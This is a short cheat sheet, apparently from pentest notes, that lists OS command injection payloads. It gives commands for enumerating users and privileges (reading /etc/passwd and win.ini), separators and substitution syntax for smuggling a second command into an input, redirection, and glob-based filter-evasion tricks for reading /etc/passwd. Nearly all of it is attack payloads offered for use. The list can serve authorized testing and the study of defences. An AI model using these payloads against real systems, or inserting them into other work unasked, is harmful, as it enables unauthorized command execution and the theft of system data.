# Command Injection List

Search Tag(s): #helpers #command-injection

## Enumeration Command Injection

### General

```
whoami
pwd
```

### Linux

- Enumerate user privileges

```
id
```

- Enumerate users

```
cat /etc/passwd
strings /etc/passwd
while read line; do echo $line; done < /etc/passwd
while IFS= read -r line;do echo "$line"; done < /etc/passwd
while IFS=: read -r username password userid groupid comment homedir cmdshell;do echo "$username, $userid, $comment $homedir"; done < /etc/passwd
```

### Windows

```
type C:\windows\win.ini
```

## Chaining Commands

```
;
$;
a;
a);
&&
&
||
|
a|
a)|
#
'
"
!
`<command>`
$(<command>)
$(`<command>`)
${<command>}
\n
0x0A
0x0a
%0A
%0a
\r
\r\n
```

## I/O Redirection

### Input

#### Linux

```
cat < /path/to/file.txt
strings < /path/to/file.txt
```

### Output

#### Linux

```
ls > /path/to/file.txt
ls >> /path/to/file.txt
$(ls) > /path/to/file.txt
$(ls) >> /path/to/file.txt
```

## Filter Evasion

### Linux

```
/bin/cat /e??/p??s??
/bin/cat /e*/pa*wd
/bin/cat /et*/pa*wd
/bin/cat /et*/pa**wd
cat$u /etc$u/passwd
```

---
## References

- [PayloadsAllTheThings: Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)

- [OS Command Injection tutorial – Part #1 (Basics and Filter Evasion)](https://0x80dotblog.wordpress.com/2021/07/28/os-command-injection-tutorial-part-1-basics-and-filter-evasion/)

- [SecJuice: Bypass Strict Input Validation With Remove Prefix and Suffix Patterns](https://www.secjuice.com/bypass-strict-input-validation-with-remove-suffix-and-prefix-pattern/)